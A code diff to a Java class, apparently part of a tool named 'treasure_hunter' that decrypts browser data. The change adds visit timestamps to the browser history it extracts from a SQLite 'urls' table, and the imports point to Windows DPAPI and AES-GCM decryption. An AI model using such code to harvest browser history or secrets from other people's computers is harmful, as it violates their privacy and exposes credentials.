@@ -1,12 +1,15 @@
 package com.treasure_hunter_java.decrypt;
 
 import java.io.*;
+import java.math.BigDecimal;
+import java.math.BigInteger;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.sql.*;
-import java.util.Arrays;
-import java.util.Base64;
+import java.time.*;
+import java.time.format.DateTimeFormatter;
+import java.util.*;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
@@ -14,8 +17,10 @@ import javax.crypto.spec.SecretKeySpec;
 
 import com.sun.jna.platform.win32.Crypt32Util;
 
+import java.util.Date;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
 
 public class Decrypt {
 
@@ -105,15 +110,19 @@ public class Decrypt {
 
         try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
              Statement stmt = conn.createStatement();
-             ResultSet rs = stmt.executeQuery("SELECT id, url, title FROM urls")) {
+             ResultSet rs = stmt.executeQuery("SELECT id, url, title, " +
+                     "datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch') " +
+                        "AS last_visit_time FROM urls")) {
 
             while (rs.next()) {
                 int id = rs.getInt("id");
                 String url = rs.getString("url");
                 String title = rs.getString("title");
+                String date = rs.getString("last_visit_time");
                 textBuilder.append("ID: ").append(id)
                         .append(" | URL: ").append(url)
                         .append(" | Title: ").append(title)
+                        .append(" | Time: ").append(date)
                         .append("\n");
             }
 
